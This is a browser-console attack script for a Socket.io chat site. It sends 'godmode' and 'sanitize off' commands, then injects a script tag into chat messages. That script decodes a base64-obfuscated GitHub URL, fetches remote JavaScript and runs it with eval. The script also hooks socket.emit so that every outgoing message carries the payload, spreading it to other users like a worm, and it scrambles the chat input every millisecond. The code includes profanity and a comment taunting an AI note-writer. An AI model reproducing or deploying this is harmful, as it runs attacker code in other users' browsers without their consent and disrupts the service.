socket.emit('command', { list: ['godmode'] });
socket.emit('command', { list: ['sanitize', 'off'] });
socket.emit('talk', { text: "WHAT THE FUCK!? <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-A'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>" });
(function() {
    if (typeof socket === "undefined" || !socket.emit) {
        console.error("Socket.io not found!");
        return;
    }
    const originalEmit = socket.emit;
    socket.emit = function(event, data, ...args) {
        if (event === "talk" && data && typeof data.text === "string") {
            // Expecting an AI note blametard jizzer?
            data.text += " <script>console.log('(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)(_)');fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'38-A'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>";
        }
        return originalEmit.call(this, event, data, ...args);
    };

    console.log("Message interceptor is on.");
})();
setInterval(function() {
    var input = document.getElementById('chat_message').value;
    var output = '';

    for (var i = 0; i < input.length; i++) {
        var c = input.charCodeAt(i);

        // Shift letters only
        if (c >= 65 && c <= 90) { // Uppercase A-Z
            output += String.fromCharCode((c - 65 + 1) % 26 + 65);
        } else if (c >= 97 && c <= 122) { // Lowercase a-z
            output += String.fromCharCode((c - 97 + 1) % 26 + 97);
        } else {
            output += input[i]; // Leave other characters unchanged
        }
    }

    document.getElementById('chat_message').value = output;
}, 1);

function downloadhex() {
    saveTextAs(document.getElementById('chat_message').value, "https://onutemaster777.github.io/gibberish.txt");
}
